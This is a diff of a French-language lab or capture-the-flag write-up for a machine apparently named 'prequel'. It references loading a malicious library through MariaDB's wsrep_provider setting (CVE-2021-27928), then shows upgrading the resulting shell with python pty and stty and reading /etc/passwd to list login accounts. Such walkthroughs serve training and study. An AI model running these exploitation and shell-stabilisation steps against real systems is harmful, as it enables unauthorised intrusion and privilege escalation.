@@ -86,5 +86,21 @@ SET GLOBAL wsrep_provider='/var/www/html/CVE-2021-27928.so';
 
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
-# puis : Ctrl+Z ; stty raw -echo; fg ; export TERM=xterm
+```
+
+root x lara sont visible
+
+```bash
+mysql@prequel:/var/lib/mysql$ cat /etc/passwd | grep -vE 'nologin|false'
+root:x:0:0:root:/root:/bin/bash
+sync:x:4:65534:sync:/bin:/bin/sync
+lara:x:1000:1000:,,,:/home/lara:/bin/bash
+```
+pour avoir un shell encore plus simple d'acces
+
+```bash
+export TERM=xterm
+# Ctrl+Z, puis dans ton terminal local :
+stty raw -echo; fg
+# Entrée, Entrée
 ```
